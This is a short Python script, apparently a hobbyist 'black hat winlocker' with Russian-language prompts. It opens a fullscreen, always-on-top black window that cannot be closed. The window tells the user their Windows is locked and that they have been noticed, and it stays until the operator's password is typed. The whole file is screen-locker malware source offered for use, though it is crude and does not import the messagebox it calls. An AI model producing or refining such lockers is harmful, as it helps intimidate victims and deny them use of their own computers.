import tkinter as tk
import ctypes
import os
import time
import json
from pathlib import Path

print(r"""
    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
        """)
print(r"""





""")
win = input("введите от кого будет сделан винлокер: ")
parol = input("введите пароль от винлокера: ")

def check_input(event=None):
    user_input = entry.get().strip()  
    if user_input == f"{parol}": 
        messagebox.showinfo("молодец!", "пароль верный! можешь пользоватся системой :)")
        root.destroy()  
    else:
        messagebox.showinfo("упс!", "неверный пароль!")

root = tk.Tk()
root.title("black hat winlocker")


root.attributes("-fullscreen", True)
root.configure(bg="black")

root.attributes("-topmost", True)

root.protocol("WM_DELETE_WINDOW", lambda: None)

label = tk.Label(root, text=f"ваш виндовс заблокирован {win}", font=("Arial", 20))
label.pack(pady=20)


entry = tk.Entry(root, width=30, font=("Arial", 12))
entry.pack(pady=10)


entry.bind("<Return>", check_input)


button = tk.Button(root, text="подтвердить", command=check_input)
button.pack(pady=5)

label = tk.Label(
    root,
    text="вас заметили",
    foreground="white",        
    background="black",  
    font=("Arial", 70),
    padx=10,
    pady=10
)
label.pack()

def show_error_box(title, text):
    ctypes.windll.user32.MessageBoxW(0, text, title, 0x00000010)


label = tk.Label(
    root,
    text="👁",
    foreground="white",        
    background="black",  
    font=("Arial", 70),
    padx=10,
    pady=10
)
label.pack()


root.mainloop()


